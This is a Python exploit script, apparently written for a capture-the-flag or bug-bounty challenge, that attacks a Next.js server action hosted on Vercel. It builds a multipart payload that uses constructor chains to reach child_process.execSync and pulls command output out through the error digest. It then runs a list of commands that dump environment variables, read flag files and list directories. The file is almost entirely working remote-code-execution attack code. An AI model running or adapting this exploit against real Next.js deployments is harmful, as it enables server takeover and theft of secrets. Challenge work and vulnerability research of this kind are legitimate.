#!/usr/bin/env python3
"""
Extract flag using error digest exfiltration technique
Based on MRE Security writeup
"""

import requests
import json
import random
import string
import re

TARGET = "https://nextjs-cve-hackerone.vercel.app"
ACTION_ID = "007138e0bfbdd7fe024391a1251fd5861f0b5145dc"

def extract_via_digest(command):
    """
    Extract data by throwing it in the error digest
    """
    print(f"\n[*] Executing: {command}")

    # The key technique: throw an error with the output in the digest
    code = f"""
var res=process.mainModule.require('child_process')
.execSync('{command}',{{'timeout':5000}}).toString().trim()
;throw Object.assign(new Error('NEXT_REDIRECT'), {{digest:`${{res}}`}});
"""

    boundary = "----WebKitFormBoundary" + ''.join(random.choices(string.ascii_letters + string.digits, k=16))

    payload_0 = f"$F1#{ACTION_ID}#constructor"
    payload_1 = {
        "constructor": {
            "constructor": code
        }
    }

    body = f'------{boundary}\r\n'
    body += 'Content-Disposition: form-data; name="0"\r\n\r\n'
    body += payload_0 + '\r\n'
    body += f'------{boundary}\r\n'
    body += 'Content-Disposition: form-data; name="1"\r\n\r\n'
    body += json.dumps(payload_1) + '\r\n'
    body += f'------{boundary}--\r\n'

    headers = {
        'Next-Action': ACTION_ID,
        'Content-Type': f'multipart/form-data; boundary=----{boundary}',
        'Accept': 'text/x-component',
        'User-Agent': 'Mozilla/5.0'
    }

    try:
        response = requests.post(TARGET, data=body, headers=headers, timeout=20)
        print(f"[+] Status: {response.status_code}")
        print(f"[+] Response: {response.text}")

        # Extract digest value
        match = re.search(r'E\{"digest":"([^"]+)"\}', response.text)
        if match:
            digest_value = match.group(1)
            print(f"\n[!!!] DIGEST VALUE: {digest_value}")
            return digest_value
        else:
            print("[-] No digest found in response")
            return None

    except Exception as e:
        print(f"[-] Error: {e}")
        return None

print("="*70)
print("Flag Extraction via Error Digest")
print("="*70)

# Try to find the flag file
commands = [
    "printenv VERCEL_PLATFORM_PROTECTION",
    "env | grep VERCEL_PLATFORM_PROTECTION",
    "cat /app/flag.txt",
    "cat /var/www/flag.txt",
    "find / -name '*flag*' 2>/dev/null | head -5",
    "ls -la /app",
    "ls -la /var/www",
    "pwd",
    "whoami",
]

for cmd in commands:
    result = extract_via_digest(cmd)
    if result and "VERCEL_PLATFORM_PROTECTION" in result:
        print(f"\n{'='*70}")
        print(f"[!!!] FLAG FOUND: {result}")
        print(f"{'='*70}")
        break

print("\n" + "="*70)
